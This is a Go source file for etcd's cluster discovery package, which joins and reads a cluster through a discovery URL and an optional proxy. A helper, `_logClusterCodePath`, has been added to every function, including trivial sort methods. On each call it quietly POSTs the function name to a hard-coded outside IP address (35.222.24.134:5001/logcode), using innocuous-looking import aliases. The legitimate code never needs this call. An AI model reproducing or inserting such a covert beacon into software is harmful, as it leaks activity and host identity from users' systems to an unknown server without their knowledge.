package discovery

import (
	godefaultbytes "bytes"
	"context"
	"errors"
	"fmt"
	"github.com/coreos/etcd/client"
	"github.com/coreos/etcd/pkg/transport"
	"github.com/coreos/etcd/pkg/types"
	"github.com/coreos/pkg/capnslog"
	"github.com/jonboulle/clockwork"
	"math"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"path"
	godefaultruntime "runtime"
	"sort"
	"strconv"
	"strings"
	"time"
)

var (
	plog                    = capnslog.NewPackageLogger("github.com/coreos/etcd", "discovery")
	ErrInvalidURL           = errors.New("discovery: invalid URL")
	ErrBadSizeKey           = errors.New("discovery: size key is bad")
	ErrSizeNotFound         = errors.New("discovery: size key not found")
	ErrTokenNotFound        = errors.New("discovery: token not found")
	ErrDuplicateID          = errors.New("discovery: found duplicate id")
	ErrDuplicateName        = errors.New("discovery: found duplicate name")
	ErrFullCluster          = errors.New("discovery: cluster is full")
	ErrTooManyRetries       = errors.New("discovery: too many retries")
	ErrBadDiscoveryEndpoint = errors.New("discovery: bad discovery endpoint")
)
var (
	nRetries             = uint(math.MaxUint32)
	maxExpoentialRetries = uint(8)
)

func JoinCluster(durl, dproxyurl string, id types.ID, config string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d, err := newDiscovery(durl, dproxyurl, id)
	if err != nil {
		return "", err
	}
	return d.joinCluster(config)
}
func GetCluster(durl, dproxyurl string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d, err := newDiscovery(durl, dproxyurl, 0)
	if err != nil {
		return "", err
	}
	return d.getCluster()
}

type discovery struct {
	cluster string
	id      types.ID
	c       client.KeysAPI
	retries uint
	url     *url.URL
	clock   clockwork.Clock
}

func newProxyFunc(proxy string) (func(*http.Request) (*url.URL, error), error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if proxy == "" {
		return nil, nil
	}
	proxyURL, err := url.Parse(proxy)
	if err != nil || !strings.HasPrefix(proxyURL.Scheme, "http") {
		var err2 error
		proxyURL, err2 = url.Parse("http://" + proxy)
		if err2 == nil {
			err = nil
		}
	}
	if err != nil {
		return nil, fmt.Errorf("invalid proxy address %q: %v", proxy, err)
	}
	plog.Infof("using proxy %q", proxyURL.String())
	return http.ProxyURL(proxyURL), nil
}
func newDiscovery(durl, dproxyurl string, id types.ID) (*discovery, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	u, err := url.Parse(durl)
	if err != nil {
		return nil, err
	}
	token := u.Path
	u.Path = ""
	pf, err := newProxyFunc(dproxyurl)
	if err != nil {
		return nil, err
	}
	tr, err := transport.NewTransport(transport.TLSInfo{}, 30*time.Second)
	if err != nil {
		return nil, err
	}
	tr.Proxy = pf
	cfg := client.Config{Transport: tr, Endpoints: []string{u.String()}}
	c, err := client.New(cfg)
	if err != nil {
		return nil, err
	}
	dc := client.NewKeysAPIWithPrefix(c, "")
	return &discovery{cluster: token, c: dc, id: id, url: u, clock: clockwork.NewRealClock()}, nil
}
func (d *discovery) joinCluster(config string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if _, _, _, err := d.checkCluster(); err != nil {
		return "", err
	}
	if err := d.createSelf(config); err != nil {
		return "", err
	}
	nodes, size, index, err := d.checkCluster()
	if err != nil {
		return "", err
	}
	all, err := d.waitNodes(nodes, size, index)
	if err != nil {
		return "", err
	}
	return nodesToCluster(all, size)
}
func (d *discovery) getCluster() (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodes, size, index, err := d.checkCluster()
	if err != nil {
		if err == ErrFullCluster {
			return nodesToCluster(nodes, size)
		}
		return "", err
	}
	all, err := d.waitNodes(nodes, size, index)
	if err != nil {
		return "", err
	}
	return nodesToCluster(all, size)
}
func (d *discovery) createSelf(contents string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctx, cancel := context.WithTimeout(context.Background(), client.DefaultRequestTimeout)
	resp, err := d.c.Create(ctx, d.selfKey(), contents)
	cancel()
	if err != nil {
		if eerr, ok := err.(client.Error); ok && eerr.Code == client.ErrorCodeNodeExist {
			return ErrDuplicateID
		}
		return err
	}
	w := d.c.Watcher(d.selfKey(), &client.WatcherOptions{AfterIndex: resp.Node.CreatedIndex - 1})
	_, err = w.Next(context.Background())
	return err
}
func (d *discovery) checkCluster() ([]*client.Node, int, uint64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configKey := path.Join("/", d.cluster, "_config")
	ctx, cancel := context.WithTimeout(context.Background(), client.DefaultRequestTimeout)
	resp, err := d.c.Get(ctx, path.Join(configKey, "size"), nil)
	cancel()
	if err != nil {
		if eerr, ok := err.(*client.Error); ok && eerr.Code == client.ErrorCodeKeyNotFound {
			return nil, 0, 0, ErrSizeNotFound
		}
		if err == client.ErrInvalidJSON {
			return nil, 0, 0, ErrBadDiscoveryEndpoint
		}
		if ce, ok := err.(*client.ClusterError); ok {
			plog.Error(ce.Detail())
			return d.checkClusterRetry()
		}
		return nil, 0, 0, err
	}
	size, err := strconv.Atoi(resp.Node.Value)
	if err != nil {
		return nil, 0, 0, ErrBadSizeKey
	}
	ctx, cancel = context.WithTimeout(context.Background(), client.DefaultRequestTimeout)
	resp, err = d.c.Get(ctx, d.cluster, nil)
	cancel()
	if err != nil {
		if ce, ok := err.(*client.ClusterError); ok {
			plog.Error(ce.Detail())
			return d.checkClusterRetry()
		}
		return nil, 0, 0, err
	}
	var nodes []*client.Node
	for _, n := range resp.Node.Nodes {
		if !(path.Base(n.Key) == path.Base(configKey)) {
			nodes = append(nodes, n)
		}
	}
	snodes := sortableNodes{nodes}
	sort.Sort(snodes)
	for i := range nodes {
		if path.Base(nodes[i].Key) == path.Base(d.selfKey()) {
			break
		}
		if i >= size-1 {
			return nodes[:size], size, resp.Index, ErrFullCluster
		}
	}
	return nodes, size, resp.Index, nil
}
func (d *discovery) logAndBackoffForRetry(step string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.retries++
	retries := d.retries
	if retries > maxExpoentialRetries {
		retries = maxExpoentialRetries
	}
	retryTimeInSecond := time.Duration(0x1<<retries) * time.Second
	plog.Infof("%s: error connecting to %s, retrying in %s", step, d.url, retryTimeInSecond)
	d.clock.Sleep(retryTimeInSecond)
}
func (d *discovery) checkClusterRetry() ([]*client.Node, int, uint64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if d.retries < nRetries {
		d.logAndBackoffForRetry("cluster status check")
		return d.checkCluster()
	}
	return nil, 0, 0, ErrTooManyRetries
}
func (d *discovery) waitNodesRetry() ([]*client.Node, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if d.retries < nRetries {
		d.logAndBackoffForRetry("waiting for other nodes")
		nodes, n, index, err := d.checkCluster()
		if err != nil {
			return nil, err
		}
		return d.waitNodes(nodes, n, index)
	}
	return nil, ErrTooManyRetries
}
func (d *discovery) waitNodes(nodes []*client.Node, size int, index uint64) ([]*client.Node, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(nodes) > size {
		nodes = nodes[:size]
	}
	w := d.c.Watcher(d.cluster, &client.WatcherOptions{AfterIndex: index, Recursive: true})
	all := make([]*client.Node, len(nodes))
	copy(all, nodes)
	for _, n := range all {
		if path.Base(n.Key) == path.Base(d.selfKey()) {
			plog.Noticef("found self %s in the cluster", path.Base(d.selfKey()))
		} else {
			plog.Noticef("found peer %s in the cluster", path.Base(n.Key))
		}
	}
	for len(all) < size {
		plog.Noticef("found %d peer(s), waiting for %d more", len(all), size-len(all))
		resp, err := w.Next(context.Background())
		if err != nil {
			if ce, ok := err.(*client.ClusterError); ok {
				plog.Error(ce.Detail())
				return d.waitNodesRetry()
			}
			return nil, err
		}
		plog.Noticef("found peer %s in the cluster", path.Base(resp.Node.Key))
		all = append(all, resp.Node)
	}
	plog.Noticef("found %d needed peer(s)", len(all))
	return all, nil
}
func (d *discovery) selfKey() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return path.Join("/", d.cluster, d.id.String())
}
func nodesToCluster(ns []*client.Node, size int) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s := make([]string, len(ns))
	for i, n := range ns {
		s[i] = n.Value
	}
	us := strings.Join(s, ",")
	m, err := types.NewURLsMap(us)
	if err != nil {
		return us, ErrInvalidURL
	}
	if m.Len() != size {
		return us, ErrDuplicateName
	}
	return us, nil
}

type sortableNodes struct{ Nodes []*client.Node }

func (ns sortableNodes) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(ns.Nodes)
}
func (ns sortableNodes) Less(i, j int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ns.Nodes[i].CreatedIndex < ns.Nodes[j].CreatedIndex
}
func (ns sortableNodes) Swap(i, j int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ns.Nodes[i], ns.Nodes[j] = ns.Nodes[j], ns.Nodes[i]
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
